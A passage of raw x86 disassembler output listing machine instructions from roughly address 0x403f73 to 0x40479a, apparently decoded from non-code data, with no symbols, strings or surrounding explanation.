  403f73:	sbb    eax,DWORD PTR [eax+0x3c]
  403f76:	inc    eax
  403f77:	and    BYTE PTR [eax],ch
  403f79:	loopne 0x403fd3
  403f7b:	xchg   edi,eax
  403f7c:	add    al,BYTE PTR [edx]
  403f7e:	add    BYTE PTR [ecx-0x7ee7d9f7],bh
  403f84:	sub    eax,0xc20a0212
  403f89:	add    BYTE PTR [edx+0x6],dl
  403f8c:	add    al,dl
  403f8e:	inc    esi
  403f8f:	sbb    al,0x6
  403f91:	add    al,BYTE PTR [eax+0x4]
  403f94:	adc    eax,0x45c1040
  403f99:	add    al,bl
  403f9b:	jns    0x403fc2
  403f9d:	dec    ebp
  403f9e:	inc    esp
  403f9f:	and    eax,0x14040053
  403fa4:	sub    al,BYTE PTR [eax]
  403fa6:	pop    eax
  403fa7:	xor    BYTE PTR [esp-0x26],0x18
  403fac:	add    dh,BYTE PTR [edx]
  403fae:	adc    al,BYTE PTR [esp+eax*4+0x1204028a]
  403fb5:	mov    al,BYTE PTR [eax-0x4f]
  403fb8:	popa   
  403fb9:	jo     0x403f5f
  403fbb:	add    BYTE PTR [eax+0x1a401850],al
  403fc1:	add    al,0x9
  403fc4:	add    cl,BYTE PTR [ecx]
  403fc6:	mov    al,0x42
  403fc8:	add    DWORD PTR [edx],edx
  403fca:	cmp    al,BYTE PTR [esi]
  403fcc:	test   DWORD PTR [eax],ebp
  403fce:	add    al,al
  403fd0:	pop    eax
  403fd1:	inc    edi
  403fd2:	add    BYTE PTR [ecx+ecx*1],ch
  403fd5:	xchg   edi,eax
  403fd6:	and    al,0x20
  403fd8:	add    BYTE PTR [eax-0x7ad3be3f],cl
  403fde:	adc    BYTE PTR ds:0x1405204c,0xa4
  403fe5:	rol    BYTE PTR [eax],0x5
  403fe8:	and    al,0x11
  403fea:	or     eax,DWORD PTR [edx+0x12]
  403fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fee:	js     0x404038
  403ff0:	data16 and al,0x0
  403ff3:	push   eax
  403ff4:	adc    BYTE PTR [ecx],0x2
  403ff7:	enter  0x2090,0x0
  403ffb:	sub    BYTE PTR [ebp+0x10],0x6
  403fff:	add    BYTE PTR [eax],cl
  404001:	adc    dl,dh
  404003:	add    BYTE PTR [esi+0x50001688],0x83
  40400a:	push   0x10a0022
  40400f:	loopne 0x404073
  404011:	add    BYTE PTR [ecx],cl
  404013:	adc    ah,BYTE PTR [edx+eiz*1]
  404016:	add    al,0x94
  404018:	add    BYTE PTR [eax+0x87b4103],bl
  40401e:	add    DWORD PTR [eax+0x2e016a2],edx
  404024:	or     dh,BYTE PTR [eax+0x0]
  404027:	test   BYTE PTR [edx+0x6044d000],al
  40402d:	or     al,0x1a
  40402f:	add    dl,BYTE PTR [esi+ecx*1]
  404032:	cmp    al,BYTE PTR [esi+0x12262000]
  404038:	and    BYTE PTR [ecx+0x514],ah
  40403e:	and    DWORD PTR [esp+ebp*4+0x11],ecx
  404042:	xchg   edx,eax
  404043:	adc    BYTE PTR [eax-0x5eff0000],cl
  404049:	mov    dl,0x10
  40404b:	test   DWORD PTR [esi],ebx
  40404d:	and    eax,0xa0c10c41
  404052:	and    BYTE PTR [edx+0x22888883],dh
  404058:	add    edx,DWORD PTR [ecx+0x12]
  40405b:	add    BYTE PTR [edx+eiz*1+0x53244241],0x0
  404063:	jno    0x404065
  404065:	add    DWORD PTR [eax],eax
  404067:	sbb    DWORD PTR [ecx+0x62250020],esp
  40406d:	in     al,0xe
  40406f:	add    ecx,DWORD PTR [eax]
  404071:	and    al,0x9
  404073:	add    al,0x51
  404075:	add    al,0x18
  404077:	pusha  
  404078:	and    BYTE PTR [edi],0x20
  40407b:	add    DWORD PTR [ecx],ecx
  40407d:	mov    cl,0xc
  40407f:	inc    ecx
  404080:	ret    0x6
  404083:	add    BYTE PTR [eax-0x5d7cbf88],al
  404089:	dec    edx
  40408a:	sub    BYTE PTR [eax],al
  40408c:	dec    esp
  40408d:	add    cl,dl
  40408f:	dec    eax
  404090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404091:	pop    esp
  404092:	add    BYTE PTR [edx],dh
  404094:	add    bl,cl
  404096:	and    BYTE PTR [ecx],dh
  404098:	inc    eax
  404099:	inc    ebx
  40409a:	add    BYTE PTR [eax],al
  40409c:	add    dl,BYTE PTR [edx+0x26254605]
  4040a2:	add    al,0x80
  4040a4:	add    al,0x90
  4040a6:	pushf  
  4040a7:	add    cl,BYTE PTR [eax]
  4040a9:	or     ah,BYTE PTR [eax+0x6110c683]
  4040af:	sub    BYTE PTR [edx],dh
  4040b1:	mov    bl,0x2
  4040b3:	or     dl,BYTE PTR [edx+0x20004]
  4040b9:	sbb    BYTE PTR [ecx],ch
  4040bb:	adc    dl,BYTE PTR [edx]
  4040bd:	add    BYTE PTR [eax+0x2904d04],0x40
  4040c4:	pusha  
  4040c5:	adc    BYTE PTR [eax],al
  4040c7:	add    al,0x22
  4040c9:	add    al,BYTE PTR [edx+0xa]
  4040cc:	and    DWORD PTR [eax],0x24241080
  4040d2:	sbb    BYTE PTR [eax+eax*4],ah
  4040d5:	or     al,0x25
  4040d7:	cdq    
  4040d8:	or     al,0x62
  4040da:	adc    BYTE PTR [eax+0xa19e02],al
  4040e0:	adc    BYTE PTR [edx+eiz*8],ah
  4040e3:	inc    eax
  4040e4:	xor    al,BYTE PTR [ecx]
  4040e6:	xor    BYTE PTR [eax+ebx*2],ah
  4040e9:	pusha  
  4040ea:	add    BYTE PTR [eax+0x43],al
  4040ed:	nop
  4040ee:	push   0x48002c8
  4040f3:	xor    al,0xa6
  4040f5:	or     BYTE PTR [eax],cl
  4040f7:	add    BYTE PTR [edx+0x8],0x5
  4040fb:	pusha  
  4040fc:	adc    dl,BYTE PTR [esi-0x20]
  4040ff:	xchg   edx,eax
  404100:	adc    BYTE PTR [ecx],ah
  404102:	add    al,0x90
  404104:	add    ecx,eax
  404106:	mov    al,ds:0x84581c60
  40410b:	repnz adc al,0x82
  40410e:	add    BYTE PTR [eax],ah
  404110:	add    eax,DWORD PTR [eax-0x80]
  404113:	add    DWORD PTR [ebx+esi*1+0x0],edx
  404117:	xchg   ecx,eax
  404118:	add    BYTE PTR [esi],cl
  40411a:	rol    BYTE PTR ds:0x60300124,0x1
  404121:	ins    BYTE PTR es:[edi],dx
  404122:	add    DWORD PTR [eax-0x1eefdf94],eax
  404128:	test   al,0x80
  40412a:	inc    eax
  40412b:	add    cl,BYTE PTR [eax+ecx*1+0x41]
  40412f:	adc    BYTE PTR [ecx],dl
  404131:	mov    ds:0x48415080,al
  404136:	fstp   QWORD PTR [edx+0x4c046a1e]
  40413c:	js     0x40415e
  40413e:	sub    dl,BYTE PTR [eax]
  404140:	adc    BYTE PTR [ecx+eax*2],cl
  404143:	add    ecx,eax
  404145:	add    BYTE PTR ds:0x11483000,al
  40414b:	pop    ecx
  40414c:	add    BYTE PTR [edx],al
  40414e:	or     DWORD PTR [edx+0x0],eax
  404151:	jo     0x40418c
  404153:	add    eax,0x88000538
  404158:	or     DWORD PTR [eax],eax
  40415a:	(bad)  [eax]
  40415c:	mov    bl,0x80
  40415e:	inc    eax
  40415f:	daa    
  404160:	or     al,BYTE PTR [eax+0x3]
  404163:	adc    ah,al
  404165:	xor    al,0x60
  404167:	or     al,0x14
  404169:	and    cl,BYTE PTR [edx+0x7418440]
  40416f:	mov    cl,0x84
  404171:	lock inc edx
  404173:	add    ch,BYTE PTR [eax]
  404175:	inc    eax
  404176:	add    DWORD PTR [eax],0x12440249
  40417c:	add    bl,BYTE PTR [eax+ecx*2]
  40417f:	and    BYTE PTR [eax+0xd500801],cl
  404185:	sub    BYTE PTR [edx],0x3
  404188:	and    BYTE PTR [eax+edx*1],al
  40418b:	xor    BYTE PTR [ecx],dl
  40418d:	adc    BYTE PTR [eax+0x4],al
  404190:	ret    
  404191:	and    bl,BYTE PTR [eax]
  404193:	and    eax,0x6a08200
  404198:	mov    ds:0x3c80880,eax
  40419d:	or     BYTE PTR [eax+0x20],ah
  4041a0:	inc    eax
  4041a1:	add    BYTE PTR [esi],bl
  4041a3:	test   DWORD PTR [ebp-0x76e7fc1c],eax
  4041a9:	push   ss
  4041aa:	add    BYTE PTR [eax],0x20
  4041ad:	add    BYTE PTR es:[eax],0x2
  4041b1:	mov    al,ds:0x1000408
  4041b6:	sbb    DWORD PTR [eax],eax
  4041b8:	add    ah,BYTE PTR [eax]
  4041ba:	fst    DWORD PTR [eax-0x39efef58]
  4041c0:	and    ecx,DWORD PTR [edx]
  4041c2:	add    edx,DWORD PTR [ebx+eax*4+0x20]
  4041c6:	inc    ecx
  4041c7:	cdq    
  4041c8:	add    BYTE PTR ds:0x9194061,dl
  4041ce:	or     cl,ah
  4041d0:	xchg   ecx,eax
  4041d1:	or     BYTE PTR [eax],al
  4041d3:	sbb    BYTE PTR [eax+eax*4],al
  4041d6:	fs call 0x1008:0x80218ac1
  4041de:	add    eax,DWORD PTR [edx]
  4041e0:	mov    BYTE PTR [edx],ah
  4041e2:	jne    0x4041b1
  4041e4:	inc    eax
  4041e5:	and    al,0x41
  4041e7:	or     cl,BYTE PTR [edx]
  4041e9:	fwait
  4041ea:	mov    al,0x88
  4041ec:	inc    esi
  4041ed:	inc    eax
  4041ee:	inc    eax
  4041ef:	xor    BYTE PTR [eax],0xa5
  4041f2:	sbb    DWORD PTR [esi+eax*1+0x2a01c008],ecx
  4041f9:	add    BYTE PTR [edx],cl
  4041fb:	sbb    BYTE PTR [edx],al
  4041fd:	add    DWORD PTR [eax],eax
  4041ff:	push   edx
  404200:	push   ss
  404201:	add    DWORD PTR [esp+ecx*2+0x4050309],0x4a024060
  40420c:	xor    BYTE PTR [eax+edx*1+0x10],al
  404210:	dec    ecx
  404211:	pop    ecx
  404212:	enter  0xa082,0x89
  404216:	and    eax,0x98000081
  40421b:	xchg   edx,eax
  40421c:	mov    BYTE PTR [edx+eax*1],ah
  40421f:	and    BYTE PTR [eax+0x2410c300],al
  404225:	sub    BYTE PTR [esi],bl
  404227:	add    BYTE PTR es:[eax],dl
  40422a:	or     eax,0x6464047
  40422f:	mov    dh,0x22
  404231:	mov    al,0x1
  404233:	add    DWORD PTR [eax-0x67fff7d6],eax
  404239:	or     DWORD PTR [eax],eax
  40423b:	pop    eax
  40423c:	add    DWORD PTR [eax+eax*1],0x84540004
  404243:	pop    edx
  404244:	add    BYTE PTR [eax],al
  404246:	add    al,BYTE PTR [ecx+0x0]
  404249:	push   eax
  40424a:	and    BYTE PTR [edx],ch
  40424c:	and    BYTE PTR [eax+0x10000300],al
  404252:	mov    BYTE PTR [eax],ch
  404254:	add    al,al
  404256:	dec    edx
  404257:	test   BYTE PTR [ecx+eax*1+0x0],dl
  40425b:	and    al,BYTE PTR [esp+eiz*4-0x6d]
  40425f:	or     al,0x8
  404261:	or     al,BYTE PTR [ecx+0x6270320a]
  404267:	and    BYTE PTR [esi+0x6],0x10
  40426b:	dec    edi
  40426c:	aad    0x3c
  40426e:	add    DWORD PTR [esi-0x6fdfdee0],0x9605a1
  404278:	or     BYTE PTR [eax],al
  40427a:	inc    eax
  40427b:	xor    BYTE PTR [ecx],al
  40427d:	pop    ss
  40427e:	mov    al,ds:0x44001000
  404283:	lea    esp,[eax]
  404285:	xor    BYTE PTR [eax],cl
  404287:	or     ecx,DWORD PTR [eax+0x42004104]
  40428d:	mov    BYTE PTR [eax+eax*1+0x10],bh
  404291:	mov    ds:0x24aa0408,al
  404296:	add    dl,BYTE PTR [eax]
  404298:	sbb    DWORD PTR [ebp+0x218087a1],esp
  40429e:	push   eax
  40429f:	bound  eax,QWORD PTR [ecx+0x4a82a102]
  4042a5:	inc    ecx
  4042a6:	adc    eax,eax
  4042a8:	add    al,0x51
  4042aa:	add    eax,0xac33083b
  4042af:	push   es
  4042b0:	inc    esp
  4042b1:	adc    BYTE PTR [eax+eax*2],bl
  4042b4:	or     BYTE PTR [eax+0x1a0a0182],ah
  4042ba:	add    BYTE PTR [eax+0x320024],dl
  4042c0:	arpl   WORD PTR [eax],ax
  4042c2:	inc    eax
  4042c3:	sub    DWORD PTR [eax-0xf53bfdd],esp
  4042c9:	and    BYTE PTR [ebp+0x10],cl
  4042cc:	adc    BYTE PTR [eax],0x40
  4042cf:	adc    DWORD PTR [eax],eax
  4042d1:	inc    esp
  4042d2:	mov    bl,0x10
  4042d4:	add    al,0x0
  4042d6:	add    DWORD PTR [edx],edx
  4042d8:	jo     0x4042f6
  4042da:	or     eax,0x2145944
  4042df:	rol    DWORD PTR [eax-0x67],0x50
  4042e3:	adc    DWORD PTR [esi],0x5040008a
  4042e9:	add    BYTE PTR [eax],ah
  4042eb:	cwde   
  4042ec:	or     BYTE PTR [ebx],dl
  4042ee:	add    BYTE PTR [ebx+0x20908328],ah
  4042f4:	add    al,0x40
  4042f6:	test   BYTE PTR ds:0x8a4c4e92,cl
  4042fc:	add    BYTE PTR [eax+0x40],ch
  4042ff:	or     eax,edx
  404301:	inc    eax
  404302:	mov    eax,gs:0xe05a40a8
  404308:	add    al,BYTE PTR [eax]
  40430a:	add    al,0x1
  40430c:	xchg   ecx,eax
  40430d:	inc    eax
  40430e:	jb     0x404312
  404310:	add    BYTE PTR es:[ecx+0xc09a503],dl
  404317:	mov    ah,BYTE PTR [esi+0x42321008]
  40431d:	test   BYTE PTR [edx],ch
  40431f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404320:	sbb    BYTE PTR [ecx+edx*1],al
  404323:	add    BYTE PTR [edx],ch
  404325:	add    BYTE PTR [esi+edx*1-0x33fbb760],ah
  40432c:	mov    ah,0x90
  40432e:	test   BYTE PTR [eax-0x79fb7dd0],al
  404334:	adc    BYTE PTR [eax-0x80],al
  404337:	adc    BYTE PTR [ecx+ecx*1+0x54002811],ah
  40433e:	mov    eax,DWORD PTR [esi+ebx*2+0x0]
  404342:	add    BYTE PTR [eax],al
  404344:	mov    WORD PTR [eax+0x70002800],es
  40434a:	add    eax,0x82003106
  40434f:	and    BYTE PTR [esi+edx*1+0x2],cl
  404353:	adc    al,dl
  404355:	add    al,BYTE PTR [edx]
  404357:	xchg   esi,eax
  404358:	push   ebp
  404359:	bound  edx,QWORD PTR [eax+eiz*8]
  40435c:	add    al,0x0
  40435e:	add    dl,BYTE PTR [esi]
  404360:	add    DWORD PTR [ebp+0x32164088],esp
  404366:	xor    BYTE PTR [eax-0x5f5b4000],al
  40436c:	xchg   esi,eax
  40436d:	add    eax,0x14da1438
  404372:	cwde   
  404373:	les    ecx,FWORD PTR [ebx-0x80]
  404376:	mov    eax,ds:0x12004090
  40437b:	or     BYTE PTR [edx+0x2469800],ch
  404381:	fs inc ecx
  404383:	inc    eax
  404384:	or     BYTE PTR [ecx],ah
  404386:	in     al,0x62
  404388:	adc    DWORD PTR [eax+0x3],eax
  40438b:	pusha  
  40438c:	push   ebp
  40438d:	and    BYTE PTR [edx+0x22008040],al
  404393:	or     BYTE PTR [edx],dl
  404395:	bound  ecx,QWORD PTR [edx]
  404397:	and    al,0x18
  404399:	add    BYTE PTR [ebx+eax*1-0x7f76fb70],dl
  4043a0:	add    al,0x90
  4043a2:	add    DWORD PTR [edx+0x0],edx
  4043a5:	add    dh,BYTE PTR [eax+0x44a903c0]
  4043ab:	mov    ds:0x10c50a05,al
  4043b0:	add    BYTE PTR [ebx],al
  4043b2:	test   al,0x43
  4043b4:	adc    al,BYTE PTR ds:0x41051481
  4043ba:	add    BYTE PTR [eax],ch
  4043bc:	push   ecx
  4043bd:	add    BYTE PTR [eax+0x41549041],bl
  4043c3:	add    BYTE PTR [edx+ecx*1+0x60],cl
  4043c7:	add    al,0xc
  4043c9:	push   ecx
  4043ca:	mov    al,ds:0x80d8000
  4043cf:	sbb    dl,BYTE PTR [eax]
  4043d1:	dec    edx
  4043d2:	add    ch,BYTE PTR [ebx]
  4043d4:	cwde   
  4043d5:	ret    0x4910
  4043d8:	and    BYTE PTR [ecx+0x124d3ac],al
  4043de:	mov    bl,al
  4043e0:	and    al,dl
  4043e2:	and    BYTE PTR [ecx],ch
  4043e4:	imul   esp,DWORD PTR [eax],0x420c0400
  4043ea:	adc    ah,dl
  4043ec:	mov    WORD PTR [eax],fs
  4043ee:	int    0x84
  4043f0:	nop
  4043f1:	popa   
  4043f2:	or     ah,BYTE PTR [eax+0x20]
  4043f5:	add    eax,DWORD PTR [ecx]
  4043f7:	push   es
  4043f8:	adc    DWORD PTR [eax],ecx
  4043fa:	sbb    al,0x18
  4043fc:	and    al,0x97
  4043fe:	or     al,BYTE PTR [ecx]
  404400:	inc    esp
  404401:	sub    BYTE PTR [esi+edx*1+0x11944819],ch
  404408:	and    BYTE PTR [eax],al
  40440a:	add    BYTE PTR [eax],dl
  40440c:	add    BYTE PTR [eax],al
  40440e:	and    BYTE PTR [ecx-0x66f2e7ff],al
  404414:	mov    DWORD PTR [eax+eax*2],eax
  404417:	inc    eax
  404418:	add    BYTE PTR [esi+0x3],dl
  40441b:	sbb    bl,BYTE PTR [eax]
  40441d:	sbb    BYTE PTR [eax],dh
  40441f:	and    ebp,ebx
  404421:	rol    BYTE PTR [eax],0x4
  404424:	inc    eax
  404425:	pushf  
  404426:	add    BYTE PTR [edx],al
  404428:	push   es
  404429:	mov    BYTE PTR [eax+0x48],ah
  40442c:	add    BYTE PTR [eax],ah
  40442e:	pop    es
  40442f:	add    BYTE PTR [eax],al
  404431:	sbb    BYTE PTR [eax],dl
  404433:	shl    esp,0x5
  404436:	leave  
  404437:	add    al,0x48
  404439:	and    DWORD PTR ss:[eax+0x26],eax
  40443d:	cli    
  40443e:	mov    al,0x4
  404440:	push   ebp
  404441:	add    DWORD PTR [ecx],eax
  404443:	push   es
  404444:	add    BYTE PTR [eax],al
  404446:	mov    dl,0x2
  404448:	xor    BYTE PTR [edx],ah
  40444a:	add    BYTE PTR [eax],dl
  40444c:	or     BYTE PTR [eax],dl
  40444e:	adc    BYTE PTR [ebp+0x1a],ah
  404451:	cmp    al,0x94
  404453:	add    BYTE PTR [eax],dl
  404455:	or     DWORD PTR [esi+0xd00486],0x2f088008
  40445f:	push   es
  404460:	mov    al,ds:0x4201280
  404465:	add    BYTE PTR [ebx+0x0],al
  404468:	rol    BYTE PTR [edx],cl
  40446a:	add    BYTE PTR [ebx],0x1
  40446d:	ja     0x4043f7
  40446f:	add    DWORD PTR [eax],eax
  404471:	push   cs
  404472:	push   0x2214820
  404477:	dec    esp
  404478:	inc    eax
  404479:	add    BYTE PTR [edx+0xf3200c6],al
  40447f:	add    al,0x4b
  404481:	add    BYTE PTR [ebx-0x65fb5ff6],al
  404487:	add    BYTE PTR [edx],cl
  404489:	loop   0x4044a3
  40448b:	and    BYTE PTR [eax],cl
  40448d:	leave  
  40448e:	cwde   
  40448f:	add    al,0x0
  404491:	or     BYTE PTR [esi],bl
  404493:	adc    BYTE PTR [eax+0x2a68022],cl
  404499:	test   al,0xaa
  40449b:	add    al,0xf0
  40449d:	add    BYTE PTR [eax],al
  40449f:	sbb    al,0x84
  4044a1:	inc    ecx
  4044a2:	add    al,0x20
  4044a4:	and    BYTE PTR [eax],al
  4044a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044a7:	xor    DWORD PTR [edx+0x40003c10],edx
  4044ad:	adc    al,0x20
  4044af:	xor    eax,0x6820041
  4044b4:	mov    ds:0x700a20da,al
  4044b9:	sbb    BYTE PTR [eax-0x3ffc5ff5],ah
  4044bf:	or     BYTE PTR es:[eax],ch
  4044c2:	add    DWORD PTR [ebx],ecx
  4044c4:	loop   0x40452e
  4044c6:	rcr    BYTE PTR [esi],0x6
  4044c9:	sbb    al,al
  4044cb:	rol    DWORD PTR [eax],0xa
  4044ce:	and    BYTE PTR [ebx],al
  4044d0:	sub    BYTE PTR [eax+eax*1+0x36040003],cl
  4044d7:	add    esp,DWORD PTR [eax+0x6e]
  4044da:	and    ebp,DWORD PTR [eax]
  4044dc:	and    al,0x10
  4044de:	add    al,BYTE PTR [eax]
  4044e0:	nop
  4044e1:	add    BYTE PTR [esi-0x7f6bff9e],ah
  4044e7:	xor    al,0x8
  4044e9:	ret    
  4044ea:	sbb    BYTE PTR [edx+0x40100008],al
  4044f0:	add    ecx,DWORD PTR [eax+0x801088c]
  4044f6:	and    BYTE PTR [esi],al
  4044f8:	nop
  4044f9:	inc    ecx
  4044fa:	sub    BYTE PTR [eax],al
  4044fc:	add    BYTE PTR [eax+0x0],al
  4044ff:	adc    BYTE PTR [esi+0x1960004a],0x0
  404506:	mov    al,ds:0x610048
  40450b:	push   eax
  40450c:	xor    cl,BYTE PTR [eax]
  40450e:	adc    ecx,DWORD PTR [edx+0x34]
  404511:	push   edx
  404512:	add    BYTE PTR [eax-0x7d9fbff8],ah
  404518:	or     BYTE PTR [ecx],al
  40451a:	nop
  40451b:	xor    DWORD PTR [eax],eax
  40451d:	jo     0x40449f
  40451f:	xchg   esp,eax
  404520:	add    al,BYTE PTR [ebp-0x2e]
  404523:	add    cl,BYTE PTR [eax]
  404525:	add    BYTE PTR [ecx],al
  404527:	or     cl,BYTE PTR [ebx]
  404529:	add    al,0xc
  40452b:	add    BYTE PTR [edx+0x41],al
  40452e:	xor    BYTE PTR [edx],dh
  404530:	xor    al,0x10
  404532:	add    BYTE PTR [eax],al
  404534:	and    dl,BYTE PTR [eax+0x4010843]
  40453a:	jmp    0x8d42:0x88004842
  404541:	add    BYTE PTR [ecx],0xca
  404544:	or     al,0x1
  404546:	add    ah,BYTE PTR ds:0x304064cb
  40454c:	add    ebx,DWORD PTR [ecx]
  40454e:	add    al,0x81
  404550:	push   eax
  404551:	sbb    BYTE PTR [edx],0xe8
  404554:	add    BYTE PTR [edx+eax*1+0xc0a040],al
  40455b:	add    BYTE PTR [eax+0x8],ah
  40455e:	or     cl,BYTE PTR [eax+0x89c0]
  404564:	and    BYTE PTR [ecx],dl
  404566:	dec    eax
  404567:	and    al,0x40
  404569:	mov    DWORD PTR [eax],ecx
  40456b:	push   eax
  40456c:	and    BYTE PTR [edx],al
  40456e:	inc    ecx
  40456f:	add    BYTE PTR [eax-0x3e5ddf9b],al
  404575:	dec    eax
  404576:	sub    al,BYTE PTR [esi]
  404578:	and    al,BYTE PTR [edx]
  40457a:	add    DWORD PTR [eax],0x1d02e024
  404580:	sbb    BYTE PTR [eax],al
  404582:	lea    eax,[eax+ecx*1-0x5f]
  404586:	shr    BYTE PTR [edx],0x4d
  404589:	add    DWORD PTR [ecx+0x10],0x28
  40458d:	or     al,0xa0
  40458f:	add    BYTE PTR [edx],al
  404591:	les    ebp,FWORD PTR [eax+0x44]
  404594:	pusha  
  404595:	add    BYTE PTR [ebx],ah
  404597:	add    BYTE PTR [eax],dl
  404599:	pop    es
  40459a:	add    dl,al
  40459c:	bound  eax,QWORD PTR [eax+eiz*8+0x16]
  4045a0:	mov    BYTE PTR [edx],al
  4045a2:	xchg   esp,eax
  4045a3:	mov    ds:0x9408e,eax
  4045a8:	add    BYTE PTR [eax],dl
  4045aa:	add    BYTE PTR [eax-0x61],0x19
  4045ae:	add    al,BYTE PTR [eax+0xa]
  4045b1:	add    BYTE PTR [eax+0x42],0x32
  4045b5:	sbb    eax,0x80248620
  4045ba:	es add al,0x22
  4045bd:	or     BYTE PTR [eax+0xa],ah
  4045c0:	arpl   WORD PTR [eax+edx*1],bp
  4045c3:	and    al,0x1
  4045c5:	mov    al,ds:0x3d910918
  4045ca:	add    BYTE PTR [ebx],dl
  4045cc:	add    bl,ah
  4045ce:	add    BYTE PTR [ecx],dl
  4045d0:	add    BYTE PTR [eax+0x12],ah
  4045d3:	sub    DWORD PTR [ebp+0x27102604],esp
  4045d9:	or     al,0xc
  4045db:	add    BYTE PTR [eax],0x0
  4045de:	sbb    BYTE PTR [edi-0x70],0x2a
  4045e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045e3:	(bad)  
  4045e4:	and    dh,BYTE PTR [eax]
  4045e6:	pop    eax
  4045e7:	add    BYTE PTR [esi-0x56f5eeec],ah
  4045ed:	xor    BYTE PTR [eax+0x2c526b10],dl
  4045f3:	add    BYTE PTR [eax+0x2d],ah
  4045f6:	inc    ecx
  4045f7:	add    bh,BYTE PTR [eax-0x3edddad8]
  4045fd:	add    al,0x80
  4045ff:	add    eax,0x8081d0e0
  404604:	add    BYTE PTR [ecx],al
  404606:	push   es
  404607:	add    DWORD PTR [eax+esi*4],edx
  40460a:	and    al,0x28
  40460c:	and    DWORD PTR ds:0x800c8500,edi
  404612:	xor    al,0x41
  404614:	sbb    al,0x6
  404616:	add    al,BYTE PTR [ebx]
  404618:	pusha  
  404619:	add    DWORD PTR [ecx+0x48a68ea0],0x181428
  404623:	adc    al,0x0
  404625:	and    al,BYTE PTR [esp+eax*1+0x4]
  404629:	xchg   BYTE PTR [eax],dl
  40462b:	push   0x4063c8
  404630:	bound  esp,QWORD PTR [edx]
  404632:	dec    edx
  404633:	add    DWORD PTR ds:0xc0286246,ecx
  404639:	add    BYTE PTR [eax-0x40],bl
  40463c:	add    BYTE PTR [edi],ah
  40463e:	add    BYTE PTR [eax+0x0],al
  404641:	add    BYTE PTR [eax+ecx*1],bl
  404644:	test   DWORD PTR [edx],eax
  404646:	inc    eax
  404647:	sub    eax,0x15652ac2
  40464c:	and    BYTE PTR [eax+0x118108a],dl
  404652:	mov    dl,0x2
  404654:	sub    BYTE PTR [edx],al
  404656:	or     DWORD PTR [eax],edx
  404658:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404659:	add    al,BYTE PTR [esi]
  40465b:	adc    al,0x8
  40465d:	add    BYTE PTR [eax+0x1d],ch
  404660:	add    DWORD PTR [eax],0x53
  404663:	add    BYTE PTR [eax+ecx*4+0xd03140],cl
  40466a:	adc    al,al
  40466c:	add    BYTE PTR [eax+0x2af30aa8],al
  404672:	jmp    0x185c6b1
  404677:	inc    eax
  404678:	adc    DWORD PTR [edx+0x79106064],eax
  40467e:	imul   ebp,DWORD PTR [eax+0x401b00],0xac820613
  404688:	and    eax,0xa3020280
  40468d:	xor    BYTE PTR [edx],0x10
  404690:	enter  0xb64,0x9d
  404694:	(bad)  
  404697:	add    DWORD PTR [ecx+0x25142214],ecx
  40469d:	or     al,BYTE PTR [ecx-0x7f975d8c]
  4046a3:	or     al,0x9c
  4046a5:	inc    edx
  4046a6:	add    al,0x41
  4046a8:	add    BYTE PTR [eax+0x208410d0],al
  4046ae:	or     ecx,DWORD PTR [eax-0x277fa7c0]
  4046b4:	mov    al,0x74
  4046b6:	adc    eax,DWORD PTR [eax+eax*2]
  4046b9:	or     eax,0x2968180
  4046be:	add    BYTE PTR [eax],cl
  4046c0:	or     BYTE PTR [ecx],ch
  4046c2:	cmp    al,0x55
  4046c4:	add    eax,0xd046001
  4046c9:	and    BYTE PTR [edx],al
  4046cb:	inc    ebp
  4046cc:	and    ch,BYTE PTR [eax]
  4046ce:	or     BYTE PTR [eax],al
  4046d0:	les    eax,FWORD PTR ds:0x15ffb410
  4046d6:	nop
  4046d7:	push   edx
  4046d8:	inc    ebx
  4046d9:	add    BYTE PTR [eax],cl
  4046db:	or     eax,DWORD PTR [ecx+0x8]
  4046de:	mov    BYTE PTR [ecx+eax*2],al
  4046e1:	(bad)  
  4046e2:	les    esp,FWORD PTR [eax]
  4046e4:	or     eax,0x202045
  4046e9:	add    ah,BYTE PTR [eax]
  4046eb:	add    cl,BYTE PTR [esi]
  4046ed:	adc    BYTE PTR [ebx-0x2c],al
  4046f0:	or     eax,0x801c6104
  4046f5:	add    DWORD PTR [eax],esp
  4046f7:	dec    esp
  4046f8:	jb     0x40475a
  4046fa:	dec    eax
  4046fb:	sbb    BYTE PTR [edx+0x18],cl
  4046fe:	or     DWORD PTR [eax+0x14101548],ecx
  404704:	call   0x801:0x3010000
  40470b:	xor    BYTE PTR [esi-0x3efdef34],dl
  404711:	mov    BYTE PTR [ebx],al
  404713:	or     al,0x45
  404715:	pop    esp
  404716:	sbb    al,0x22
  404718:	or     eax,0x11860d1b
  40471d:	inc    ebx
  40471e:	add    al,0x10
  404720:	add    DWORD PTR [eax+0x64],ecx
  404723:	or     DWORD PTR [ebp+0x41],0x19
  404727:	cwde   
  404728:	add    BYTE PTR [eax],cl
  40472a:	xor    esi,DWORD PTR [edx-0x62fff2bd]
  404730:	inc    edx
  404731:	adc    eax,esi
  404733:	or     BYTE PTR [edx+eax*1],al
  404736:	call   0xa904c93d
  40473b:	add    al,0x80
  40473d:	adc    DWORD PTR [ecx+0x8681b04],edx
  404743:	mov    al,ds:0x1a201415
  404748:	xchg   BYTE PTR gs:[ebp+0x1],cl
  40474c:	jno    0x4047b6
  40474e:	cmp    BYTE PTR [eax+0x4c],al
  404751:	mov    al,0x97
  404753:	adc    ecx,DWORD PTR [edx+edx*1]
  404756:	inc    ebx
  404757:	mov    BYTE PTR [esp+ecx*1],cl
  40475a:	add    eax,0x40405004
  40475f:	add    BYTE PTR [eax],dl
  404761:	add    BYTE PTR [ebx],cl
  404763:	add    BYTE PTR [edx+edx*1+0x20],ah
  404767:	or     al,0x1e
  404769:	add    BYTE PTR [eax-0x13],0x0
  40476d:	add    BYTE PTR [eax],cl
  40476f:	dec    eax
  404770:	inc    esi
  404771:	add    al,0x0
  404773:	add    BYTE PTR [eax],al
  404775:	add    BYTE PTR [eax-0x80],al
  404778:	inc    ecx
  404779:	add    DWORD PTR [ebp+0x8008a11],eax
  40477f:	push   ecx
  404780:	or     DWORD PTR [edx+0x14230400],eax
  404786:	add    DWORD PTR [eax+ebx*1+0x420e0108],0x80140828
  404791:	add    BYTE PTR ds:0x49800202,ah
  404797:	or     BYTE PTR [eax],0x80
  40479a:	and    BYTE PTR [ecx],bl
